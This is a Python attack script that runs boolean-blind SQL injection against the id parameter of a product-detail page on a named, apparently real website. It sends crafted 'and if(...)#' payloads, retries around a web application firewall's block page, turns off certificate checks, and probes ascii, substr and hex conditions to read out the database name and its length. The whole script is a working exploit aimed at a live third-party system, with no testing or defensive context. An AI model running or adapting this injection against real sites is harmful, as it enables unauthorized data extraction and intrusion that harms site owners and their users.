#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, time, re
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(2):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(2); continue
        if 'WTS-WAF' in b:
            time.sleep(3); continue
        if 'Invalid SQL' in b:
            m = re.search(r'MySQL Error[^<]*<', b)
            return ('ERR', m.group(0)[:100] if m else '')
        return ('RES', TRUE_MARK in b)
    return ('TIMEOUT', '')

def test(cond):
    return q("687' and if(%s,687,0)#" % cond)

# 关键测试
tests = [
    ('ascii(a)=97', "ascii('a')=97"),
    ('ascii(a)=65', "ascii('a')=65"),
    ('ord(a)=97', "ord('a')=97"),
    ('substr(database(),1,1)直接比较a', "substr(database(),1,1)='a'"),
    ('substr(database(),1,1)=y', "substr(database(),1,1)='y'"),
    ('database()完整=yijingweb', "database()='yijingweb'"),
    ('database()=库名(hex比较)', "hex(database())='79696A696E67776562'"),
    ('length(db)=9重测', "length(database())=9"),
    ('length(db)=8', "length(database())=8"),
]
for name, cond in tests:
    r = test(cond)
    print('%s -> %s' % (name, r))
    time.sleep(0.5)
